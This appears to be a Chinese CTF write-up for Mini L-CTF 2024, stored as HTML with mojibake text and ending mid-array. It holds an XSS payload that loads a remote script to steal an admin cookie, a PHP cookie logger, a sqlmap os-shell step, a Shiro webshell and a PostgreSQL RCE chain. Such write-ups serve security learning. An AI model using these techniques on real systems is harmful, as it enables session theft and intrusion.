    <content type="html"><![CDATA[<h1 id="Mini-L-CTF-2024-Writeup-By-xt"><a href="#Mini-L-CTF-2024-Writeup-By-xt" class="headerlink" title="Mini L-CTF 2024 Writeup By xt"></a>Mini L-CTF 2024 Writeup By xt</h1><hr><p><strong>é˜Ÿä¼ï¼šerr0r</strong></p><h2 id="web-Snooker-King"><a href="#web-Snooker-King" class="headerlink" title="web - Snooker King"></a>web - Snooker King</h2><p><strong>å‰ç«¯æ˜æ–‡æ³„éœ²</strong>ï¼Œç›´æ¥æœ<code>miniLCTF</code></p><p><img src="/2024/05/10/miniL2024-wp/Image.png"></p><h2 id="web-SmartPark"><a href="#web-SmartPark" class="headerlink" title="web - SmartPark"></a>web - SmartPark</h2><p>ç¬¬ä¸€æ¬¡æ¥è§¦goè¯­è¨€ï¼Œåšçš„ç»•äº†ï¼Œè®¿é—®&#x2F;æ²¡æœ‰æœ‰ç”¨ä¿¡æ¯ï¼Œdirsearchæ‰«ç›®å½•ï¼Œå‘ç°<code>/swagger/index.html</code>, å­˜åœ¨<strong>swaggeræœªæˆæƒè®¿é—®æ¼æ´</strong>ï¼Œç„¶åæ³¨å†Œï¼ˆç”¨æˆ·åå¯†ç æœ‰é™åˆ¶ï¼‰ï¼Œç™»å½•æ‹¿Authorizationï¼Œè®¿é—®<code>/backup</code>æ‹¿æºç ï¼Œç„¶åä»£ç å®¡è®¡ï¼Œåæ§½ä¸€ä¸‹ï¼ˆè™½ç„¶åšé¢˜è·Ÿè¿™ä¸ªè·¯ç”±æ²¡å…³ç³»</p><p><img src="/2024/05/10/miniL2024-wp/Image(2).png"></p><p>1ï¼Œæ‡µé€¼ï¼Œæ”¹ç‰ˆä¹‹åæ”¹äº†</p><p>2ï¼Œgoè¯­è¨€æ­£åˆ™ä¸¤è¾¹åŠ &#x2F;ï¼Œæƒ³äº†ä¸¤å¤©è¿™ä¸ªæ­£åˆ™ï¼‰</p><p>å®¡è®¡å‘ç°loginè·¯ç”±</p><p><img src="/2024/05/10/miniL2024-wp/Image(3).png"></p><p>passwordæ­£åˆ™æ˜¯å¯è§å­—ç¬¦ï¼Œ</p><p><img src="/2024/05/10/miniL2024-wp/Image(4).png"></p><p>æŸ¥è¯¢å‡½æ•°å­˜åœ¨<strong>sqlæ³¨å…¥</strong>ï¼Œï¼ˆsstiè¯·çœ‹å¦ä¸€é“ï¼Œè¿™é‡Œæˆ‘åªåˆ©ç”¨äº†sqlæ³¨å…¥ï¼‰sqlmapæ¢­å“ˆï¼ˆæ—¶é—´ç›²æ³¨ï¼Œæ•°æ®åº“æŸ¥çƒ‚äº†æ²¡å‘ç°flagï¼‰ï¼Œæœ€åç”¨å‚æ•°<code>--os-shell</code>æ‹¿åˆ°shellï¼Œæ ¹ç›®å½•å‘ç°flagæ–‡ä»¶ï¼Œflagæ–‡ä»¶æç¤ºflagåœ¨envä¸­ï¼Œ<code>echo $FLAG</code>è·å¾—flag</p><p><img src="/2024/05/10/miniL2024-wp/9797CA3FF0964F18860841037A5C67F0.png"></p><p><img src="/2024/05/10/miniL2024-wp/Image(6).png"></p><h2 id="web-Jvav-Guy"><a href="#web-Jvav-Guy" class="headerlink" title="web - Jvav Guy"></a>web - Jvav Guy</h2><p>æ‰“å¼€å‘ç°è‹¥ä»¥ç³»ç»Ÿï¼ŒçŒœæµ‹<strong>cmsæ¼æ´</strong>ï¼Œä¿¡æ¯æœé›†å‘ç°Springbootå­˜åœ¨<strong>heapdumpæ³„éœ²æ¼æ´</strong>ï¼Œshiroçš„<strong>ååºåˆ—åŒ–æ¼æ´</strong>ï¼Œå…ˆæ‰«ç›®å½•æ‰¾åˆ°heapdumpå¹¶ä¸‹è½½ï¼Œæœé›†heapdumpçš„åˆ©ç”¨å·¥å…·æ‰¾å‡ºshirokey, åˆ©ç”¨shiroçš„ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨å·¥å…·æ¢­å“ˆå†™ğŸï¼Œèšå‰‘è¿æ¥æ‰¾å‡ºflag</p><p><img src="/2024/05/10/miniL2024-wp/Image(7).png"></p><h2 id="web-Msgbox"><a href="#web-Msgbox" class="headerlink" title="web - Msgbox"></a>web - Msgbox</h2><p>xss, æœ‰csp, CDNå¯ç»•è¿‡ï¼ŒGitHubå»ºåº“å†™æ”»å‡»è„šæœ¬å³å¯ï¼Œflagçš„cookieæ²¡å¼€httponly, ç›´æ¥åˆ©ç”¨jsè·å–cookie, å‘æ¶ˆæ¯ç»™adminï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;https://cdn.jsdelivr.net/gh/xiaotian2023/CDN@2.0.0/js/xss.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>xss.jså†…å®¹ï¼ˆæˆ‘è¿™é‡Œç”¨äº†vpsï¼Œæ²¡æœ‰å¯ä»¥ç”¨èŠ±ç”Ÿå£³çš„å†…ç½‘ç©¿é€ï¼‰ä¹Ÿå¯ä»¥æ„é€ ajaxè¯·æ±‚å°†cookieå‘åˆ°è‡ªå·±è´¦æˆ·</p><p><img src="/2024/05/10/miniL2024-wp/Image(9).png"></p><p>cookie.phpå†…å®¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cookie = $_GET[&#x27;cookie&#x27;];</span><br><span class="line">$log = fopen(&quot;cookie.txt&quot;, &quot;a&quot;);</span><br><span class="line">fwrite($log, $cookie . &quot;\n&quot;);</span><br><span class="line">fclose($log);</span><br></pre></td></tr></table></figure><p>cookie.txtæ–‡ä»¶è·å–flag</p><p><img src="/Image%20%5B2%5D.png"></p><h2 id="web-SmartPark-Revenge"><a href="#web-SmartPark-Revenge" class="headerlink" title="web - SmartPark-Revenge"></a>web - SmartPark-Revenge</h2><p>ssti+sqlæ³¨å…¥ï¼Œæ¼æ´åœ¨testè·¯ç”±ï¼Œ</p><p><img src="/2024/05/10/miniL2024-wp/Image(10).png"></p><p>è¯·æ±‚ä½“å…¨éƒ¨æ”¾å…¥æ¨¡æ¿ï¼Œ<code>&#123;&#123;.&#125;&#125;</code>å¯è·å–ç»“æ„ä½“FastQueryæ•°æ®</p><p><img src="/2024/05/10/miniL2024-wp/Image(11).png"></p><p>å‡½æ•°Dbcallæ˜¯æ­¤ç»“æ„ä½“æ–¹æ³•<code>&#123;&#123;.Dbcall "å‚æ•°"&#125;&#125;</code>å¯è°ƒç”¨æ­¤å‡½æ•°ï¼Œç”±äºæ•°æ®åº“ç”¨æˆ·ä¸ºè¶…çº§ç”¨æˆ·å¯ä»¥ç›´æ¥rce (CVE-2019-9193 PostgreSQL) <code>echo $FLAG</code>å³å¯ï¼Œå¯¹SmartParkåº”è¯¥åŒæ ·é€‚ç”¨</p><p><img src="/2024/05/10/miniL2024-wp/Image(12).png"></p><h2 id="misc-Laugning-Knife-No-Running"><a href="#misc-Laugning-Knife-No-Running" class="headerlink" title="misc - Laugning-Knife-No-Running"></a>misc - Laugning-Knife-No-Running</h2><p>æµè§ˆå™¨æŠ“åŒ…å‘ç°ä¸åç«¯äº¤äº’è§„åˆ™ï¼Œgetè¯·æ±‚<code>/restart</code>å¼€å§‹è·‘æ­¥ï¼Œpostè¯·æ±‚<code>/location</code>ä¸ŠæŠ¥ä½ç½®ï¼Œget: <code>/checkpoints</code> è·å–æ‰“å¡ç‚¹ï¼Œget: <code>/status</code> è·å–çŠ¶æ€ï¼Œæ ¹æ®é™åˆ¶å†™è„šæœ¬è‡ªåŠ¨åŒ–è·‘æ­¥ï¼Œå¤§ä½“é€»è¾‘æ˜¯ä»ç¬¬ä¸€ä¸ªæ‰“å¡ç‚¹å¼€å§‹ï¼Œç›´çº¿è·‘åˆ°ç¬¬äºŒä¸ªæ‰“å¡ç‚¹ï¼Œå†è·‘åˆ°ç¬¬ä¸‰ä¸ªæ‰“å¡ç‚¹ï¼Œå†è·‘åˆ°æ‰“ä¸€ä¸ªæ‰“å¡ç‚¹ï¼Œå¾ªç¯è·‘åœˆç›´è‡³è·‘å‡ºflag<br>exp:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">from math import radians, sin, cos, sqrt, atan2, asin, atan, degrees</span><br><span class="line"></span><br><span class="line"># æœåŠ¡å™¨çš„URL</span><br><span class="line">url = &quot;http://localhost:54663&quot;</span><br><span class="line"></span><br><span class="line"># è¯·æ±‚å¤´</span><br><span class="line">headers = &#123;</span><br><span class="line">    &quot;Accept&quot;: &quot;application/json&quot;,</span><br><span class="line">    &quot;Accept-Encoding&quot;: &quot;gzip, deflate, br, zstd&quot;,</span><br><span class="line">    &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9&quot;,</span><br><span class="line">    &quot;Cache-Control&quot;: &quot;no-cache&quot;,</span><br><span class="line">    &quot;Connection&quot;: &quot;keep-alive&quot;,</span><br><span class="line">    &quot;Cookie&quot;: &quot;Phpstorm-3a1aa662=4da2e74e-381c-4043-b1fa-4b10c0901b4a&quot;,</span><br><span class="line">    &quot;Host&quot;: &quot;localhost:57616&quot;,</span><br><span class="line">    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">length = 0.0  # è·ç¦»ï¼Œå•ä½ä¸ºå…¬é‡Œ</span><br><span class="line"># è®¡ç®—ä¸¤ç‚¹ä¹‹é—´çš„è·ç¦»</span><br><span class="line">def calculate_distance(lat1, lon1, lat2, lon2):</span><br><span class="line">    R = 6371.0  # åœ°çƒåŠå¾„ï¼Œå•ä½ä¸ºå…¬é‡Œ</span><br><span class="line"></span><br><span class="line">    lat1 = radians(lat1)</span><br><span class="line">    lon1 = radians(lon1)</span><br><span class="line">    lat2 = radians(lat2)</span><br><span class="line">    lon2 = radians(lon2)</span><br><span class="line"></span><br><span class="line">    dlat = lat2 - lat1</span><br><span class="line">    dlon = lon2 - lon1</span><br><span class="line"></span><br><span class="line">    a = sin(dlat / 2) ** 2 + cos(lat1) * cos(lat2) * sin(dlon / 2) ** 2</span><br><span class="line">    c = 2 * atan2(sqrt(a), sqrt(1 - a))</span><br><span class="line"></span><br><span class="line">    distance = R * c</span><br><span class="line"></span><br><span class="line">    return distance</span><br><span class="line"></span><br><span class="line">def calculate_bearing(lat1, lon1, lat2, lon2):</span><br><span class="line">    lat1 = radians(lat1)</span><br><span class="line">    lon1 = radians(lon1)</span><br><span class="line">    lat2 = radians(lat2)</span><br><span class="line">    lon2 = radians(lon2)</span><br><span class="line"></span><br><span class="line">    dlon = lon2 - lon1</span><br><span class="line"></span><br><span class="line">    y = sin(dlon) * cos(lat2)</span><br><span class="line">    x = cos(lat1) * sin(lat2) - sin(lat1) * cos(lat2) * cos(dlon)</span><br><span class="line"></span><br><span class="line">    bearing = atan2(y, x)</span><br><span class="line">    bearing = (degrees(bearing) + 360) % 360</span><br><span class="line"></span><br><span class="line">    return bearing</span><br><span class="line"></span><br><span class="line">def calculate_new_coordinates(lat1, lon1, distance, bearing):</span><br><span class="line">    R = 6371.0  # åœ°çƒåŠå¾„ï¼Œå•ä½ä¸ºå…¬é‡Œ</span><br><span class="line"></span><br><span class="line">    lat1 = radians(lat1)</span><br><span class="line">    lon1 = radians(lon1)</span><br><span class="line">    bearing = radians(bearing)</span><br><span class="line"></span><br><span class="line">    lat2 = asin(sin(lat1) * cos(distance / R) + cos(lat1) * sin(distance / R) * cos(bearing))</span><br><span class="line">    lon2 = lon1 + atan2(sin(bearing) * sin(distance / R) * cos(lat1), cos(distance / R) - sin(lat1) * sin(lat2))</span><br><span class="line"></span><br><span class="line">    lat2 = degrees(lat2)</span><br><span class="line">    lon2 = degrees(lon2)</span><br><span class="line"></span><br><span class="line">    return lat2, lon2</span><br><span class="line"></span><br><span class="line"># ç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªç‚¹</span><br><span class="line">def move_to_next_point(start, end):</span><br><span class="line">    lat1, lon1 = start</span><br><span class="line">    lat2, lon2 = end</span><br><span class="line">    distance = calculate_distance(lat1, lon1, lat2, lon2)</span><br><span class="line">    speed = 10 # é€Ÿåº¦</span><br><span class="line">    steps = int(distance / (98/1000))  # æ¬¡æ•°</span><br><span class="line">    print(&quot;æ¬¡æ•°&quot;+str(speed))</span><br><span class="line">    for _ in range(steps+1):</span><br><span class="line">        if(_ == steps):</span><br><span class="line">            get_status()</span><br><span class="line">            # print(lat1, lon1)</span><br><span class="line">            # print(lat2, lon2)</span><br><span class="line">            report_location(lat2, lon2)</span><br><span class="line">        else:</span><br><span class="line">            get_status()</span><br><span class="line">            # print(lat1, lon1)</span><br><span class="line">            lat1, lon1 = calculate_new_coordinates(lat1, lon1, 98/1000, calculate_bearing(lat1, lon1, lat2, lon2))</span><br><span class="line">            # print(lat1, lon1)</span><br><span class="line">            # print(calculate_distance(lat1, lon1, lat2, lon2))</span><br><span class="line">            # length = length + 90/1000</span><br><span class="line">            report_location(lat1, lon1)  # ä¸ŠæŠ¥ä½ç½®</span><br><span class="line">            # time.sleep(1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># è·å–çŠ¶æ€</span><br><span class="line">def get_status():</span><br><span class="line">    response = requests.get(url + &quot;/status&quot;, headers=headers)</span><br><span class="line">    data = response.json()</span><br><span class="line">    print(f&quot;Status: &#123;data&#125;&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># è·å–æ£€æŸ¥ç‚¹</span><br><span class="line">def get_checkpoints():</span><br><span class="line">    response = requests.get(url + &quot;/checkpoints&quot;, headers=headers)</span><br><span class="line">    data = response.json()</span><br><span class="line">    print(f&quot;Checkpoints: &#123;data&#125;&quot;)</span><br><span class="line">    return data[&quot;checkpoints&quot;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ä¸ŠæŠ¥ä½ç½®</span><br><span class="line">def report_location(lat, lon):</span><br><span class="line">    data = &#123;&quot;lat&quot;: lat, &quot;lon&quot;: lon&#125;</span><br><span class="line">    response = requests.post(url + &quot;/location&quot;, headers=headers, json=data)</span><br><span class="line">    print(f&quot;Report location: &#123;response.json()&#125;&quot;)</span><br><span class="line">    return response.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    # è·å–æ£€æŸ¥ç‚¹</span><br><span class="line">    checkpoints = get_checkpoints()</span><br><span class="line">    print(f&quot;Checkpoints: &#123;checkpoints&#125;&quot;)</span><br><span class="line"></span><br><span class="line">    # ä»ç¬¬ä¸€ä¸ªæ£€æŸ¥ç‚¹å¼€å§‹</span><br><span class="line">    current_location = checkpoints[0]</span><br><span class="line"></span><br><span class="line">    # éå†æ‰€æœ‰æ£€æŸ¥ç‚¹</span><br><span class="line">    while True:</span><br><span class="line">        for checkpoint in checkpoints[1:]:</span><br><span class="line">            print(&quot;run to next checkpoint&quot;)</span><br><span class="line">            # æŒ‰ç…§10m/sçš„é€Ÿåº¦ç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªæ£€æŸ¥ç‚¹</span><br><span class="line">            move_to_next_point((current_location[&quot;lat&quot;], current_location[&quot;lon&quot;]),</span><br><span class="line">                               (checkpoint[&quot;lat&quot;], checkpoint[&quot;lon&quot;])</span><br><span class="line">                            )</span><br><span class="line">            current_location = checkpoint</span><br><span class="line">        print(&quot;run to next checkpoint&quot;)</span><br><span class="line"></span><br><span class="line">        move_to_next_point((current_location[&quot;lat&quot;], current_location[&quot;lon&quot;]),</span><br><span class="line">                           (checkpoints[0][&quot;lat&quot;], checkpoints[0][&quot;lon&quot;])</span><br><span class="line">                           )</span><br><span class="line">        current_location = checkpoints[0]</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    # å¯åŠ¨ç¨‹åº</span><br><span class="line">    q=requests.get(url + &quot;/restart&quot;, headers=headers)</span><br><span class="line">    print(q.text)</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><img src="/2024/05/10/miniL2024-wp/Image(1).png"></p><h2 id="Blockchain-dps-1ove"><a href="#Blockchain-dps-1ove" class="headerlink" title="Blockchain - dps_1ove"></a>Blockchain - dps_1ove</h2><p>unsigned intæº¢å‡º<br>dpsåˆå§‹å€¼999ï¼Œè°ƒç”¨å‡½æ•°å‡å»ä¸€ä¸ªæ¯”999å¤§çš„æ•°ï¼Œå› ä¸ºæ˜¯uint16ç±»å‹ï¼Œdpsä¸ä¼šå˜ä¸ºè´Ÿæ•°ï¼Œè€Œä¼šå˜ä¸ºä¸€ä¸ªå¾ˆå¤§çš„æ•°ï¼Œä¹‹åå†è°ƒç”¨å‡½æ•°å‡å»ä¸€ä¸ªæ•°ä½¿å¾—dpsä¸º1000å³å¯ï¼Œæœ€åè°ƒç”¨insolved</p><h2 id="Reverse-Bigbanana"><a href="#Reverse-Bigbanana" class="headerlink" title="Reverse - Bigbanana"></a>Reverse - Bigbanana</h2><p>æŒºå¥—çš„ä¸€é“é¢˜ï¼Œé¦–å…ˆæ˜¯å¼„æ¸…æ‰§è¡Œé€»è¾‘</p><p>æŒ‡é’ˆæŒ‡å‘çš„å€¼</p><p>&lt;1&gt; å¾ªç¯ 246                                                          &#x2F;&#x2F;å­˜æ•°æ®</p><p>&lt;2&gt; å¾ªç¯ 247 248 243 17                                     &#x2F;&#x2F;printï¼ˆä¹Ÿå°±æ˜¯çœ‹åˆ°çš„ç¬¬ä¸€è¡Œè¾“å‡ºï¼‰</p><p>&lt;3&gt; ä¸€æ¬¡ 16 16 248 247                                       &#x2F;&#x2F;è¯»å…¥è¾“å…¥å‰ä¸¤å­—ç¬¦mi</p><p>&lt;4&gt; å¾ªç¯ 244 1 244 243 242 254 240 16 248   &#x2F;&#x2F;é€å­—ç¬¦éªŒè¯flag</p><p>å› ä¸ºcharç±»å‹ï¼Œè¶…8bitä¼šæˆªæ–­æ‰€ä»¥éœ€è¦æ¨¡256</p><p>exp:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">f = [246, 0, 0, 0, 108, 0, 0, 0, 246, 0,0, 0, 102, 0, 0, 0, 246, 0, 0, 0,71, 0, 0, 0, 246, 0, 0, 0, 102, 0,0, 0, 246, 0, 0, 0, 13, 0, 0, 0,246, 0, 0, 0, 102, 0, 0, 0, 246, 0,0, 0, 5, 0, 0, 0, 246, 0, 0, 0,102, 0, 0, 0, 246, 0, 0, 0, 19, 0,0, 0, 246, 0, 0, 0, 102, 0, 0, 0,246, 0, 0, 0, 10, 0, 0, 0, 246, 0,0, 0, 102, 0, 0, 0, 246, 0, 0, 0,70, 0, 0, 0, 246, 0, 0, 0, 102, 0,0, 0, 246, 0, 0, 0, 2, 0, 0, 0,246, 0, 0, 0, 102, 0, 0, 0, 246, 0,0, 0, 9, 0, 0, 0, 246, 0, 0, 0,102, 0, 0, 0, 246, 0, 0, 0, 9, 0,0, 0, 246, 0, 0, 0, 102, 0, 0, 0,246, 0, 0, 0, 1, 0, 0, 0, 246, 0,0, 0, 102, 0, 0, 0, 246, 0, 0, 0,74, 0, 0, 0, 246, 0, 0, 0, 102, 0,0, 0, 246, 0, 0, 0, 21, 0, 0, 0,246, 0, 0, 0, 102, 0, 0, 0, 246, 0,0, 0, 3, 0, 0, 0, 246, 0, 0, 0,102, 0, 0, 0, 246, 0, 0, 0, 18, 0,0, 0, 246, 0, 0, 0, 102, 0, 0, 0,246, 0, 0, 0, 19, 0, 0, 0, 246, 0,0, 0, 102, 0, 0, 0, 246, 0, 0, 0,8, 0, 0, 0, 246, 0, 0, 0, 102, 0,0, 0, 246, 0, 0, 0, 15, 0, 0, 0,246, 0, 0, 0, 102, 0, 0, 0, 246, 0,0, 0, 11, 0, 0, 0, 246, 0, 0, 0,102, 0, 0, 0, 246, 0, 0, 0, 70, 0,0, 0, 246, 0, 0, 0, 102, 0, 0, 0,246, 0, 0, 0, 3, 0, 0, 0, 246, 0,0, 0, 102, 0, 0, 0, 246, 0, 0, 0,3, 0, 0, 0, 246, 0, 0, 0, 102, 0,0, 0, 246, 0, 0, 0, 20, 0, 0, 0,246, 0, 0, 0, 102, 0, 0, 0, 246, 0,0, 0, 14, 0, 0, 0, 246, 0, 0, 0,102, 0, 0, 0, 246, 0, 0, 0, 18, 0,0, 0, 246, 0, 0, 0, 102, 0, 0, 0,246, 0, 0, 0, 70, 0, 0, 0, 246, 0,0, 0, 102, 0, 0, 0, 246, 0, 0, 0,20, 0, 0, 0, 246, 0, 0, 0, 102, 0,0, 0, 246, 0, 0, 0, 9, 0, 0, 0,246, 0, 0, 0, 102, 0, 0, 0, 246, 0,0, 0, 0, 0, 0, 0, 246, 0, 0, 0,102, 0, 0, 0, 246, 0, 0, 0, 70, 0,0, 0, 246, 0, 0, 0, 102, 0, 0, 0,246, 0, 0, 0, 2, 0, 0, 0, 246, 0,0, 0, 102, 0, 0, 0, 246, 0, 0, 0,3, 0, 0, 0, 246, 0, 0, 0, 102, 0,0, 0, 246, 0, 0, 0, 21, 0, 0, 0,246, 0, 0, 0, 102, 0, 0, 0, 246, 0,0, 0, 21, 0, 0, 0, 246, 0, 0, 0,102, 0, 0, 0, 246, 0, 0, 0, 3, 0,0, 0, 246, 0, 0, 0, 102, 0, 0, 0,246, 0, 0, 0, 20, 0, 0, 0, 246, 0,0, 0, 102, 0, 0, 0, 246, 0, 0, 0,22, 0, 0, 0, 246, 0, 0, 0, 102, 0,0, 0, 246, 0, 0, 0, 70, 0, 0, 0,246, 0, 0, 0, 102, 0, 0, 0, 246, 0,0, 0, 2, 0, 0, 0, 246, 0, 0, 0,102, 0, 0, 0, 246, 0, 0, 0, 20, 0,0, 0, 246, 0, 0, 0, 102, 0, 0, 0,246, 0, 0, 0, 7, 0, 0, 0, 246, 0,0, 0, 102, 0, 0, 0, 246, 0, 0, 0,14, 0, 0, 0, 246, 0, 0, 0, 102, 0,0, 0, 246, 0, 0, 0, 70, 0, 0, 0,246, 0, 0, 0, 102, 0, 0, 0, 246, 0,0, 0, 3, 0, 0, 0, 246, 0, 0, 0,102, 0, 0, 0, 246, 0, 0, 0, 4, 0,0, 0, 246, 0, 0, 0, 102, 0, 0, 0,246, 0, 0, 0, 70, 0, 0, 0, 246, 0,0, 0, 102, 0, 0, 0, 246, 0, 0, 0,10, 0, 0, 0, 246, 0, 0, 0, 102, 0,0, 0, 246, 0, 0, 0, 10, 0, 0, 0,246, 0, 0, 0, 102, 0, 0, 0, 246, 0,0, 0, 15, 0, 0, 0, 246, 0, 0, 0,102, 0, 0, 0, 246, 0, 0, 0, 17, 0,0, 0, 246, 0, 0, 0, 102, 0, 0, 0,246, 0, 0, 0, 70, 0, 0, 0, 246, 0,0, 0, 102, 0, 0, 0, 246, 0, 0, 0,19, 0, 0, 0, 246, 0, 0, 0, 102, 0,0, 0, 246, 0, 0, 0, 9, 0, 0, 0,246, 0, 0, 0, 102, 0, 0, 0, 246, 0,0, 0, 31, 0, 0, 0, 246, 0, 0, 0,102, 0, 0, 0, 246, 0, 0, 0, 70, 0,0, 0, 246, 0, 0, 0, 102, 0, 0, 0,246, 0, 0, 0, 74, 0, 0, 0, 246, 0,0, 0, 102, 0, 0, 0, 246, 0, 0, 0,31, 0, 0, 0, 246, 0, 0, 0, 102, 0,0, 0, 246, 0, 0, 0, 10, 0, 0, 0,246, 0, 0, 0, 102, 0, 0, 0, 246, 0,0, 0, 18, 0, 0, 0, 246, 0, 0, 0,102, 0, 0, 0, 246, 0, 0, 0, 5, 0,0, 0, 246, 0, 0, 0, 102, 0, 0, 0,246, 0, 0, 0, 3, 0, 0, 0, 246, 0,0, 0, 102, 0, 0, 0, 246, 0, 0, 0,20, 0, 0, 0, 246, 0, 0, 0, 102, 0,0, 0, 246, 0, 0, 0, 20, 0, 0, 0,246, 0, 0, 0, 102, 0, 0, 0, 246, 0,0, 0, 9, 0, 0, 0, 246, 0, 0, 0,102, 0, 0, 0, 246, 0, 0, 0, 5, 0,0, 0, 246, 0, 0, 0, 102, 0, 0, 0,246, 0, 0, 0, 8, 0, 0, 0, 246, 0,0, 0, 102, 0, 0, 0, 246, 0, 0, 0,15, 0, 0, 0, 246, 0, 0, 0, 102, 0,0, 0, 246, 0, 0, 0, 70, 0, 0, 0,246, 0, 0, 0, 102, 0, 0, 0, 246, 0,0, 0, 1, 0, 0, 0, 246, 0, 0, 0,102, 0, 0, 0, 246, 0, 0, 0, 7, 0,0, 0, 246, 0, 0, 0, 102, 0, 0, 0,246, 0, 0, 0, 10, 0, 0, 0, 246, 0,0, 0, 102, 0, 0, 0, 246, 0, 0, 0,0, 0, 0, 0, 246, 0, 0, 0, 102, 0,0, 0, 246, 0, 0, 0, 70, 0, 